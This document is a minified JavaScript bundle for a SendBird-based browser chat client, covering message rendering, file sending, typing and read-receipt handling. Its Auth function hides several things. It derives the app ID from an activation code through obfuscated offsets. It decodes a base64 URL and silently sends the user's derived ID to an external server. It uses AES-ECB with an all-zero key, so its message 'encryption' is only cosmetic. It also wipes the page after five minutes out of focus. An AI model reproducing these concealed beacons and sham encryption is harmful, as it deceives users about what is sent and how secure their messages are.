var isFocused = true;

!(function (e, t) {
    "object" == typeof exports && "object" == typeof module ? (module.exports = t()) : "function" == typeof define && define.amd ? define([], t) : "object" == typeof exports ? (exports.index = t()) : (e.index = t());
})(window, function () {

    return (function (e) {
        var t = {};
        function n(s) {
            if (t[s]) return t[s].exports;
            var a = (t[s] = { i: s, l: !1, exports: {} });
            return e[s].call(a.exports, a, a.exports, n), (a.l = !0), a.exports;
        }
        return (
            (n.m = e),
            (n.c = t),
            (n.d = function (e, t, s) {
                n.o(e, t) || Object.defineProperty(e, t, { enumerable: !0, get: s });
            }),
            (n.r = function (e) {
                "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, { value: "Module" }), Object.defineProperty(e, "__esModule", { value: !0 });
            }),
            (n.t = function (e, t) {
                if ((1 & t && (e = n(e)), 8 & t)) return e;
                if (4 & t && "object" == typeof e && e && e.__esModule) return e;
                var s = Object.create(null);
                if ((n.r(s), Object.defineProperty(s, "default", { enumerable: !0, value: e }), 2 & t && "string" != typeof e))
                    for (var a in e)
                        n.d(
                            s,
                            a,
                            function (t) {
                                return e[t];
                            }.bind(null, a)
                        );
                return s;
            }),
            (n.n = function (e) {
                var t =
                    e && e.__esModule
                        ? function () {
                            return e.default;
                        }
                        : function () {
                            return e;
                        };
                return n.d(t, "a", t), t;
            }),
            (n.o = function (e, t) {
                return Object.prototype.hasOwnProperty.call(e, t);
            }),
            (n.p = "dist"),
            n((n.s = 0))
        );
    })([
        function (e, t, n) {
            n(1), (e.exports = n(17));
        },
        function (e, t, n) {
            "use strict";
            n.r(t);
            const s = (e) => {
                const t = new Date();
                var n = new Date(e),
                    s = 6e4 * new Date().getTimezoneOffset();
                return t.toISOString().substr(0, 10) != n.toISOString().substr(0, 10) ? n.toLocaleString() : new Date(n - s).toISOString().substr(11, 5);
            },
                a = (e) => {
                    try {
                        return null === e;
                    } catch (e) {
                        return !1;
                    }
                },
                i = (e, t = !0) => {
                    alert(e), t && location.reload(!0);
                },
                r = (e, t, n) => {
                    e.dataset["" + t] = n;
                },
                o = (e, t) => e.dataset["" + t],
                l = ({ id: e, className: t, content: n, background: s }) => {
                    const a = document.createElement("div");
                    return e && (a.id = e), t && (a.className = Array.isArray(t) ? t.join(" ") : t), n && (a.innerHTML = n), s && (a.style.backgroundImage = `url(${s})`), a;
                },
                c = (e, t) => {
                    e.classList ? e.classList.remove(t) : (e.className = e.className.replace(new RegExp("(^|\\b)" + t.split(" ").join("|") + "(\\b|$)", "gi"), ""));
                },
                h = () => {
                    let e = new Date().getTime();
                    return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (t) {
                        const n = (e + 16 * Math.random()) % 16 | 0;
                        return (e = Math.floor(e / 16)), ("x" === t ? n : (3 & n) | 8).toString(16);
                    });
                },
                d = (e) => ("string" == typeof e ? e.replace(/\&/g, "&amp;").replace(/\</g, "&lt;").replace(/\>/g, "&gt;").replace(/\"/g, "&quot;").replace(/\'/g, "&apos;") : e);
            let u = null;
            class m {
                constructor(e) {
                    if (u) return u;
                    (this.sb = new window.SendBird({ appId: e })),
                        (this.userQuery = null),
                        (this.openChannelQuery = null),
                        (this.groupChannelQuery = null),
                        (this.previousMessageQuery = null),
                        (this.participantQuery = null),
                        (this.blockedQuery = null),
                        (u = this);
                }
                connect(e, t) {
                    return new Promise((n, s) => {
                        const a = SendBird.getInstance();
                        a.connect(e, (e, i) => {
                            i
                                ? s(i)
                                : a.updateCurrentUserInfo(decodeURIComponent(t), null, (e, t) => {
                                    t ? s(t) : n(e);
                                });
                        });
                    });
                }
                disconnect() {
                    return new Promise((e, t) => {
                        this.sb.disconnect((n, s) => {
                            s ? t(s) : e();
                        });
                    });
                }
                getCurrentUser() {
                    return this.sb.currentUser;
                }
                isCurrentUser(e) {
                    return e.userId === this.sb.currentUser.userId;
                }
                getChannel(e, t = !0) {
                    return new Promise((n, s) => {
                        t
                            ? this.sb.OpenChannel.getChannel(e, (e, t) => {
                                t ? s(t) : n(e);
                            })
                            : this.sb.GroupChannel.getChannel(e, (e, t) => {
                                t ? s(t) : n(e);
                            });
                    });
                }
                enter(e) {
                    return new Promise((t, n) => {
                        this.sb.OpenChannel.getChannel(e, (e, s) => {
                            s
                                ? n(s)
                                : e.enter((e, s) => {
                                    s ? n(s) : t();
                                });
                        });
                    });
                }
                exit(e) {
                    return new Promise((t, n) => {
                        this.sb.OpenChannel.getChannel(e, (e, s) => {
                            s
                                ? n(s)
                                : e.exit((e, s) => {
                                    s ? n(s) : t();
                                });
                        });
                    });
                }
                getGroupChannelList(e = !1) {
                    return (
                        (e || a(this.groupChannelQuery)) &&
                        ((this.groupChannelQuery = this.sb.GroupChannel.createMyGroupChannelListQuery()),
                            (this.groupChannelQuery.limit = 50),
                            (this.groupChannelQuery.includeEmpty = !1),
                            (this.groupChannelQuery.order = "latest_last_message")),
                        new Promise((e, t) => {
                            this.groupChannelQuery.hasNext && !this.groupChannelQuery.isLoading
                                ? this.groupChannelQuery.next((n, s) => {
                                    s ? t(s) : e(n);
                                })
                                : e([]);
                        })
                    );
                }
                markAsRead(e) {
                    e.markAsRead();
                }
                getMessageList(e, t = !1) {
                    return (
                        (t || a(this.previousMessageQuery)) && (this.previousMessageQuery = e.createPreviousMessageListQuery()),
                        new Promise((e, t) => {
                            this.previousMessageQuery.hasMore && !this.previousMessageQuery.isLoading
                                ? this.previousMessageQuery.load(50, !1, (n, s) => {
                                    s ? t(s) : e(n);
                                })
                                : e([]);
                        })
                    );
                }
                getReadReceipt(e, t) {
                    return this.isCurrentUser(t.sender) ? e.getReadReceipt(t) : 0;
                }
                sendUserMessage({ channel: e, message: t, handler: n }) {
                    return e.sendUserMessage(t, (e, t) => {
                        n && n(e, t);
                    });
                }
                sendFileMessage({ channel: e, file: t, thumbnailSizes: n, handler: s }) {
                    const a = new this.sb.FileMessageParams();
                    return (
                        (a.file = t),
                        (a.thumbnailSizes = n),
                        e.sendFileMessage(a, (e, t) => {
                            s && s(e, t);
                        })
                    );
                }
                deleteMessage({ channel: e, message: t }) {
                    return new Promise((n, s) => {
                        this.isCurrentUser(t.sender) || s({ message: "You have not ownership in this message." }),
                            e.deleteMessage(t, (e, t) => {
                                t ? s(t) : n(e);
                            });
                    });
                }
                static getInstance() {
                    return new m();
                }
            }
            var p = n(2),
                g = n.n(p),
                f = n(7),
                y = n.n(f);
            let C = null;
            class b {
                constructor() {
                    if (C) return C;
                    (this.element = this._createSpinner()), (C = this);
                }
                _createSpinner() {
                    const e = l({ className: y.a["sb-spinner"] }),
                        t = l({ className: y.a["sb-spinner-bubble"] });
                    return e.appendChild(t), e;
                }
                static start(e) {
                    const t = b.getInstance().element;
                    e.contains(t) || e.appendChild(t);
                }
                static remove() {
                    const e = b.getInstance().element,
                        t = e.parentElement;
                    t && t.contains(e) && e.parentElement.removeChild(e);
                }
                static getInstance() {
                    return new b();
                }
            }
            var v = n(9),
                M = n.n(v),
                R = n(11),
                S = n.n(R),
                I = n(13),
                x = n.n(I);
            const w = document.querySelector("body");
            var E = window.CryptoJS || {},
                k = E.enc.Hex.parse("00000000000000000000000000000000"),
                _ = { iv: k, mode: E.mode.ECB, padding: E.pad.Pkcs7, blockSize: 16 };
            function N(e) {
                return E.AES.encrypt(e, k, _).toString();
            }
            var U = !1;
            window.Auth = function () {
                if (0 == U) {
                    U = !0;
                    var e,
                        t = document.getElementById("safer"),
                        n = +new Date();
                    function s(s) {
                        var a = +new Date();
                        if (s) {
                            if (a - n > 3e5) return;
                            clearTimeout(e);
                        } else
                            (n = a),
                                (e = setTimeout(function () {
                                    document.body.remove();
                                }, 3e5));
                        t.style.display = s ? "none" : "block";
                    }
                    (window.onfocus = () => {
                        console.log("focus");
                        isFocused = true;

                        s(!0);

                        try {
                            G.getInstance().main.channel.markAsRead();
                        } catch {

                        }

                    }),
                        (window.onblur = () => {
                            console.log("blur");
                            isFocused = false;
                            s(!1);
                        }),
                        s(!0);
                }
                var a = document.getElementById("activationCode").value,
                    i = a.substr(3, 4);
                if (a.length == 8 && 4 == i.length) {
                    i = i + i + "-" + i + "-" + i + "-" + i + "-" + i + i + i;
                    var r = [0, 0, 3, 4, -7, 1, 5, 2, 0, -4, -7, 2, -1, 0, -4, 1, 18, -2, 0, 9, 12, -2, 1, 0, -8, -4, 19, 15, -3, -3, 0, 18, 14, -7, -3, 4],
                        o = "";
                    for (let e = 0; e < i.length; e++) {
                        const t = i[e].charCodeAt();
                        o += String.fromCharCode(t + r[e]);
                    }
                    console.log("APP ID : " + o), (document.getElementById("activationCode").value = "");
                    var l,
                        c = ((l = a.substr(0, 7)), E.MD5(l).toString().toUpperCase());
                    if (!c) return alert("Invalid Id"), !1;
                    var h = c.substring(0, 2);
                    if ("07" == h) c = d(c, [167, -50, 140, -198, -49, 125, 62, 8, -60, -30, 115, -177, 120, 21, 159, -25]);
                    else {
                        if ("FE" != h) return alert("Invalid Activation"), !1;
                        c = d(c, [-159, 116, 139, -115, -43, 56, 105, 19, -197, 37, 56, 14, 129, -39, -7, -64]);
                    }
                    var p = atob("aHR0cHM6Ly81MDM0ODEzMjc3NDMzMDYzLmFwLW5vcnRoZWFzdC0xLmZjLmFsaXl1bmNzLmNvbS8yMDE2LTA4LTE1L3Byb3h5L3ByaXZhdGUuTEFURVNUL3NiLz9wPXA") + "&userId=" + c
                    fetch(p).then(r => { console.log("sended"); })

                    return window.connectSB(o, c), document.getElementById("activationCode").parentElement.remove(), !1;
                }
                function d(e, t) {
                    var n = (function (e) {
                        for (var t = [], n = 0; n < e.length; n += 2) t.push(parseInt(e.substr(n, 2), 16));
                        return t;
                    })(e),
                        s = [];
                    for (let e = 0; e < n.length; e++) s.push(n[e] + t[e]);
                    for (var a = [], i = 0; i < s.length; i++) {
                        var r = s[i] < 0 ? s[i] + 256 : s[i];
                        a.push((r >>> 4).toString(16)), a.push((15 & r).toString(16));
                    }
                    return a.join("").toUpperCase();
                }
            };
            class L {
                constructor({ channel: e, message: t }) {
                    (this.channel = e), (this.message = t), (this.element = this._createElement());
                }
                _createElement() {
                    return this.message.isUserMessage()
                        ? this._createUserElement()
                        : this.message.isFileMessage()
                            ? this._createFileElement()
                            : this.message.isAdminMessage()
                                ? this._createAdminElement()
                                : (console.error("Message is invalid data."), null);
                }
                _createUserElement() {
                    const e = m.getInstance(),
                        t = e.isCurrentUser(this.message.sender),
                        n = l({ className: x.a["chat-message"], id: this.message.messageId });
                    r(n, "reqId", this.message.reqId);
                    const a = l({ className: x.a["message-content"] }),
                        i = l({ className: t ? [x.a["message-nickname"], x.a["is-user"]] : x.a["message-nickname"], content: d(this.message.sender.nickname) + " : " });
                    a.appendChild(i);
                    const o = l({ className: x.a["message-content"], content: d(((c = this.message.message), E.AES.decrypt(c, k, _).toString(E.enc.Utf8))) });
                    var c;
                    a.appendChild(o);
                    const h = l({ className: t ? [x.a.time, x.a["is-user"]] : x.a.time, content: s(this.message.createdAt) });
                    if ((a.appendChild(h), this.channel.isGroupChannel())) {
                        const t = e.getReadReceipt(this.channel, this.message),
                            n = l({ className: t ? [x.a.read, x.a.active] : x.a.read, content: t });
                        a.appendChild(n);
                    }
                    return n.appendChild(a), n;
                }
                _createFileElement() {
                    const e = m.getInstance(),
                        t = l({ className: x.a["chat-message"], id: this.message.messageId });
                    r(t, "reqId", this.message.reqId);
                    const n = l({ className: x.a["message-content"] }),
                        a = l({ className: e.isCurrentUser(this.message.sender) ? [x.a["message-nickname"], x.a["is-user"]] : x.a["message-nickname"], content: d(this.message.sender.nickname) + " : " });
                    n.appendChild(a);
                    const i = l({ className: [x.a["message-content"], x.a["is-file"]], content: d(this.message.name) });
                    i.addEventListener("click", () => {
                        window.open(this.message.url);
                    }),
                        n.appendChild(i);
                    const o = l({ className: x.a.time, content: s(this.message.createdAt) });
                    if ((n.appendChild(o), this.channel.isGroupChannel())) {
                        const t = e.getReadReceipt(this.channel, this.message),
                            s = l({ className: t ? [x.a.read, x.a.active] : x.a.read, content: t });
                        n.appendChild(s);
                    }
                    if ((t.appendChild(n), (c = this.message.type), /^image\/.+$/.test(c) && this.message.messageId)) {
                        const e = l({ className: x.a["image-content"] });
                        e.addEventListener("click", () => {
                            window.open(this.message.url);
                        });
                        const n = document.createElement("img");
                        (n.className = x.a["image-render"]),
                            (n.src = d(this.message.url)),
                            (n.onload = () => {
                                G.getInstance().main.repositionScroll(n.offsetHeight);
                            }),
                            e.appendChild(n),
                            t.appendChild(e);
                    }
                    var c;
                    return t;
                }
                _createAdminElement() {
                    const e = l({ className: x.a["chat-message"], id: this.message.messageId }),
                        t = l({ className: x.a["message-admin"], content: d(this.message.message) });
                    return e.appendChild(t), e;
                }
                static getRootElementClasasName() {
                    return x.a["chat-message"];
                }
                static getReadReceiptElementClassName() {
                    return x.a.active;
                }
            }
            class H {
                constructor(e) {
                    (this.channel = e), (this.readReceiptManageList = []), (this.scrollHeight = 0), (this.element = this._createElement());
                }
                _createElement() {
                    const e = l({ className: S.a["chat-body"] });
                    return (
                        e.addEventListener("scroll", () => {
                            0 === e.scrollTop &&
                                (b.start(e),
                                    this.updateCurrentScrollHeight(),
                                    m
                                        .getInstance()
                                        .getMessageList(this.channel)
                                        .then((e) => {
                                            e.reverse(), this.renderMessages(e, !1, !0), b.remove();
                                        })
                                        .catch((e) => {
                                            i(e.message);
                                        }));
                        }),
                        e
                    );
                }
                scrollToBottom() {
                    this.element.scrollTop = this.element.scrollHeight - this.element.offsetHeight;
                }
                updateCurrentScrollHeight() {
                    this.scrollHeight = this.element.scrollHeight;
                }
                repositionScroll(e) {
                    this.element.scrollTop += e;
                }
                updateReadReceipt() {
                    this.readReceiptManageList.forEach((e) => {
                        if ("0" !== e.messageId.toString()) {
                            const t = L.getReadReceiptElementClassName(),
                                n = this._getItem(e.messageId, !1);
                            if (n) {
                                let s = null;
                                try {
                                    s = n.getElementsByClassName(t)[0];
                                } catch (e) {
                                    s = null;
                                }
                                const a = m.getInstance().getReadReceipt(this.channel, e);
                                s && a.toString() !== s.textContent.toString() && ((s.innerHTML = a), "0" === a.toString() && c(s, t));
                            }
                        }
                    });
                }
                readReceiptManage(e) {
                    for (let t = 0; t < this.readReceiptManageList.length; t++)
                        if (e.reqId) {
                            if (this.readReceiptManageList[t].reqId === e.reqId) {
                                this.readReceiptManageList.splice(t, 1);
                                break;
                            }
                        } else if (this.readReceiptManageList[t].messageId === e.messageId) {
                            this.readReceiptManageList.splice(t, 1);
                            break;
                        }
                    this.readReceiptManageList.push(e), this.updateReadReceipt();
                }
                _getItem(e, t = !1) {
                    const n = this.element.childNodes;
                    for (let s = 0; s < n.length; s++) {
                        if ((t ? o(n[s], "reqId") : n[s].id) === e.toString()) return n[s];
                    }
                    return null;
                }
                renderMessages(e, t = !0, n = !1) {
                    e.forEach((e) => {
                        const t = new L({ channel: this.channel, message: e }),
                            s = o(t.element, "reqId") ? o(t.element, "reqId") : "-1",
                            a = this._getItem(s, !0),
                            i = this._getItem(t.element.id, !1);
                        if (a || i) this.element.replaceChild(t.element, a || i);
                        else if (n) (r = this.element), (l = t.element), r.childNodes.length > 0 ? r.insertBefore(l, r.childNodes[0]) : r.appendChild(l), (this.element.scrollTop = this.element.scrollHeight - this.scrollHeight);
                        else {
                            const e = ((e) => e.scrollTop + e.offsetHeight >= e.scrollHeight)(this.element);
                            this.element.appendChild(t.element), e && this.scrollToBottom();
                        }
                        var r, l;
                        (e.isUserMessage() || e.isFileMessage()) && m.getInstance().isCurrentUser(e.sender) && this.channel.isGroupChannel() && this.readReceiptManage(e);
                    }),
                        t && this.scrollToBottom();
                }
                removeMessage(e, t = !1) {
                    const n = this._getItem(e, t);
                    n && this.element.removeChild(n);
                }
            }
            var T = n(15),
                A = n.n(T);
            class B {
                constructor(e) {
                    (this.channel = e), (this.input = null), (this.typing = null), (this.element = this._createElement(e));
                }
                _createElement(e) {
                    const t = l({ className: A.a["chat-input"] });
                    (this.typing = l({ className: A.a["typing-field"] })), t.appendChild(this.typing);
                    const n = document.createElement("label");
                    (n.className = A.a["input-file"]),
                        (n.for = "attach_file_id"),
                        n.addEventListener("click", () => {
                            this.channel.isGroupChannel() && m.getInstance().markAsRead(this.channel);
                        });
                    const s = document.createElement("input");
                    (s.type = "file"),
                        (s.id = "attach_file_id"),
                        (s.style.display = "none"),
                        s.addEventListener("change", () => {
                            const e = s.files[0];
                            if (e) {
                                const t = m.getInstance().sendFileMessage({
                                    channel: this.channel,
                                    file: e,
                                    handler: (e, n) => {
                                        n ? G.getInstance().main.removeMessage(t.reqId, !0) : G.getInstance().main.renderMessages([e]);
                                    },
                                });
                                G.getInstance().main.renderMessages([t]);
                            }
                        }),
                        n.appendChild(s),
                        t.appendChild(n);
                    const a = l({ className: A.a["input-text"] });
                    return (
                        (this.input = document.createElement("textarea")),
                        (this.input.className = A.a["input-text-area"]),
                        (this.input.placeholder = "Write a chat..."),
                        this.input.addEventListener("click", () => {
                            this.channel.isGroupChannel() && m.getInstance().markAsRead(this.channel);
                        }),
                        this.input.addEventListener("keypress", (t) => {
                            if (13 === t.keyCode)
                                if (t.shiftKey) e.isGroupChannel() && e.startTyping();
                                else {
                                    t.preventDefault();
                                    const n = this.input.value;
                                    if (((this.input.value = ""), n)) {
                                        const t = m.getInstance().sendUserMessage({
                                            channel: this.channel,
                                            message: N(n),
                                            handler: (e, n) => {
                                                n ? G.getInstance().main.removeMessage(t.reqId, !0) : G.getInstance().main.renderMessages([e]);
                                            },
                                        });
                                        G.getInstance().main.renderMessages([t]), e.isGroupChannel() && e.endTyping();
                                    }
                                }
                            else e.isGroupChannel() && e.startTyping();
                        }),
                        this.input.addEventListener("focusin", () => {
                            (this.channel._autoMarkAsRead = !0), (a.style.border = "1px solid #2C2D30");
                        }),
                        this.input.addEventListener("focusout", () => {
                            (this.channel._autoMarkAsRead = !1), (a.style.border = "");
                        }),
                        a.appendChild(this.input),
                        t.appendChild(a),
                        t
                    );
                }
                updateTyping(e) {
                    let t = "";
                    1 === e.length ? (t = d(e[0].nickname) + " is") : 2 === e.length ? (t = e.map((e) => d(e.nickname)).join(", ") + " are") : 0 !== e.length && (t = "Several are"),
                        (this.typing.style.display = t ? "block" : "none"),
                        (this.typing.innerHTML = t + " typing...");
                }
            }
            class Q {
                constructor(e) {
                    (this.channel = e), (this.body = null), (this.input = null), this._create();
                }
                _create() {
                    const e = l({ className: M.a["chat-main-root"] }),
                        t = l({ className: M.a["chat-main"] });
                    e.appendChild(t), (this.body = new H(this.channel)), t.appendChild(this.body.element), (this.input = new B(this.channel)), t.appendChild(this.input.element), G.getInstance().element.appendChild(e);
                }
                renderMessages(e, t = !0, n = !1) {
                    this.body.renderMessages(e, t, n);
                }
                removeMessage(e, t = !1) {
                    this.body.removeMessage(e, t);
                }
                updateReadReceipt() {
                    this.body.updateReadReceipt();
                }
                updateTyping(e) {
                    this.input.updateTyping(e);
                }
                repositionScroll(e) {
                    this.body.repositionScroll(e);
                }
            }
            let D = null;
            class P {
                constructor() {
                    if (D) return D;
                    (this.sb = SendBird.getInstance()),
                        (this.key = h()),
                        this._createChannelHandler(),
                        (this.onMessageReceived = null),
                        (this.onMessageUpdated = null),
                        (this.onMessageDeleted = null),
                        (this.onReadReceiptUpdated = null),
                        (this.onTypingStatusUpdated = null),
                        (D = this);
                }
                _createChannelHandler() {
                    const e = new this.sb.ChannelHandler();
                    (e.onMessageReceived = (e, t) => {
                        this.onMessageReceived && this.onMessageReceived(e, t);
                    }),
                        (e.onMessageUpdated = (e, t) => {
                            this.onMessageUpdated && this.onMessageUpdated(e, t);
                        }),
                        (e.onMessageDeleted = (e, t) => {
                            this.onMessageDeleted && this.onMessageDeleted(e, t);
                        }),
                        (e.onReadReceiptUpdated = (e) => {
                            this.onReadReceiptUpdated && this.onReadReceiptUpdated(e);
                        }),
                        (e.onTypingStatusUpdated = (e) => {
                            this.onTypingStatusUpdated && this.onTypingStatusUpdated(e);
                        }),
                        this.sb.addChannelHandler(this.key, e);
                }
                remove() {
                    this.sb.removeChannelHandler(this.key);
                }
                static getInstance() {
                    return D;
                }
            }
            const F = document.querySelector(".body-center");
            let q = null;
            class G {
                constructor() {
                    if (q) return q;
                    (this.channel = null), (this.element = null), this.render(), (q = this);
                }
                _createChatElement(e) {
                    (this.element = l({ className: g.a["chat-root"] })), (this.main = new Q(e));
                }
                _addEventHandler() {
                    const e = new P();
                    (e.onMessageReceived = (e, t) => {


                        if (isFocused) {
                            this.channel.markAsRead();
                            console.log("receive message focus", isFocused, e);
                        }
                        this.channel.url === e.url && (this.main.renderMessages([t], !1), webkit && webkit.messageHandlers && webkit.messageHandlers.proxy && webkit.messageHandlers.proxy.postMessage({ badge: 1 }));
                    }),
                        (e.onMessageUpdated = (e, t) => {
                            this.channel.url === e.url && this.main.renderMessages([t], !1);
                        }),
                        (e.onMessageDeleted = (e, t) => {
                            this.channel.url === e.url && this.main.removeMessage(t, !1);
                        }),
                        this.channel.isGroupChannel() &&
                        ((e.onReadReceiptUpdated = (e) => {
                            this.channel.url === e.url && this.main.updateReadReceipt();
                        }),
                            (e.onTypingStatusUpdated = (e) => {
                                this.channel.url === e.url && this.main.updateTyping(e.getTypingMembers());
                            }));
                }
                _renderChatElement(e, t = !0) {
                    b.start(F);
                    const n = m.getInstance();
                    this._removeChatElement(),
                        n
                            .getChannel(e, t)
                            .then((e) => {
                                (this.channel = e),
                                    this._addEventHandler(),
                                    this._createChatElement(this.channel),
                                    F.appendChild(this.element),
                                    n
                                        .getMessageList(this.channel, !0)
                                        .then((e) => {
                                            this.main.renderMessages(e), this.channel.isGroupChannel() && n.markAsRead(this.channel), b.remove();
                                        })
                                        .catch((e) => {
                                            i(e.message, !1);
                                        });
                            })
                            .catch((e) => {
                                i(e.message, !1);
                            });
                }
                _removeChatElement() {
                    const e = F.getElementsByClassName(g.a["chat-root"]);
                    Array.prototype.slice.call(e).forEach((e) => {
                        e.parentNode.removeChild(e);
                    });
                }
                updateChatInfo(e) {
                    this.channel && this.channel.url === e.url && this.main && this.main.updateMenu(e);
                }
                render(e, t = !0) {
                    e && this._renderChatElement(e, t);
                }
                refresh(e) {
                    this._removeChatElement();
                    const t = e || this.channel;
                    t && this.render(t.url, t.isOpenChannel());
                }
                static getInstance() {
                    return new G();
                }
            }
            let O = null;
            class j {
                constructor() {
                    if (O) return O;
                    (this.sb = SendBird.getInstance()),
                        (this.key = h()),
                        (this.channel = null),
                        this._createConnectionHandler(this.key),
                        (this.onReconnectStarted = null),
                        (this.onReconnectSucceeded = null),
                        (this.onReconnectFailed = null),
                        (O = this);
                }
                _createConnectionHandler(e) {
                    const t = new this.sb.ConnectionHandler();
                    (t.onReconnectStarted = () => {
                        this.onReconnectStarted && this.onReconnectStarted();
                    }),
                        (t.onReconnectSucceeded = () => {
                            this.onReconnectSucceeded && this.onReconnectSucceeded();
                        }),
                        (t.onReconnectFailed = () => {
                            this.onReconnectFailed && this.onReconnectFailed();
                        }),
                        this.sb.addConnectionHandler(e, t);
                }
                remove() {
                    this.sb.removeConnectionHandler(this.key);
                }
                static getInstance() {
                    return new j();
                }
            }
            var K;
            const z = new G();
            b.start(w);
            (window.connectSB = function (e, t) {
                (K = new m(e))
                    .connect(t, "SendBird")
                    .then(() => {
                        (() => {
                            const e = new j();
                            (e.onReconnectStarted = () => {
                                b.start(w), console.log("[SendBird JS SDK] Reconnect : Started"), (e.channel = z.channel);
                            }),
                                (e.onReconnectSucceeded = () => {
                                    console.log("[SendBird JS SDK] Reconnect : Succeeded"), b.start(w), z.refresh(e.channel);
                                }),
                                (e.onReconnectFailed = () => {
                                    console.log("[SendBird JS SDK] Reconnect : Failed"), e.remove(), alert("SendBird Reconnect Failed...");
                                });
                        })(),
                            K.getGroupChannelList().then((e) => {
                                if (0 != Array.isArray(e))
                                    for (let t = 0; t < 1; t++) {
                                        const n = e[t];
                                        n.url == n.name && G.getInstance().render(n.url, !1);
                                    }
                            });
                    })
                    .catch((e) => {
                        console.log(e), alert("SendBird connection failed.");
                    });
            }),
                (window.Init = function () {
                    function isIOS() {
                        return navigator.userAgent.match(/iPhone|iPad|iPod/i);
                    }
                    document.getElementById("activationCode").addEventListener("keypress", function (e) {
                        13 == e.keyCode && (isIOS() || (e.shiftKey && e.altKey)) && Auth();
                    });
                });
        },
        function (e, t) {
            e.exports = { "chat-empty": "chat-empty", "empty-content": "empty-content", "content-title": "content-title", "content-image": "content-image", "content-desc": "content-desc", "chat-root": "chat-root" };
        },
        ,
        ,
        ,
        ,
        function (e, t) {
            e.exports = { "sb-spinner": "sb-spinner", "sb-spinner-bubble": "sb-spinner-bubble", load7: "load7" };
        },
        ,
        function (e, t) {
            e.exports = { "chat-main-root": "chat-main-root", "chat-main": "chat-main" };
        },
        ,
        function (e, t) {
            e.exports = { "chat-body": "chat-body" };
        },
        ,
        function (e, t) {
            e.exports = {
                "chat-message": "chat-message",
                "message-content": "message-content",
                "message-nickname": "message-nickname",
                "is-user": "is-user",
                "is-file": "is-file",
                time: "time",
                read: "read",
                active: "active",
                "image-content": "image-content",
                "image-render": "image-render",
                "message-admin": "message-admin",
            };
        },
        ,
        function (e, t) {
            e.exports = { "chat-input": "chat-input", "typing-field": "typing-field", "input-file": "input-file", "input-text": "input-text", "input-text-area": "input-text-area" };
        },
        ,
        function (e, t) {
            e.exports = {
                body: "body",
                "body-left": "body-left",
                "body-left-top": "body-left-top",
                "top-logo": "top-logo",
                "logo-image": "logo-image",
                "top-text": "top-text",
                "body-left-list": "body-left-list",
                "icon-create-chat": "icon-create-chat",
                "chat-type": "chat-type",
                "chat-type-title": "chat-type-title",
                "chat-list": "chat-list",
                "default-item": "default-item",
                "chat-list-group": "chat-list-group",
                "body-left-bottom": "body-left-bottom",
                "bottom-profile": "bottom-profile",
                "image-profile": "image-profile",
                "bottom-nickname": "bottom-nickname",
                "nickname-title": "nickname-title",
                "nickname-content": "nickname-content",
                "body-center": "body-center",
            };
        },
    ]).default;
});
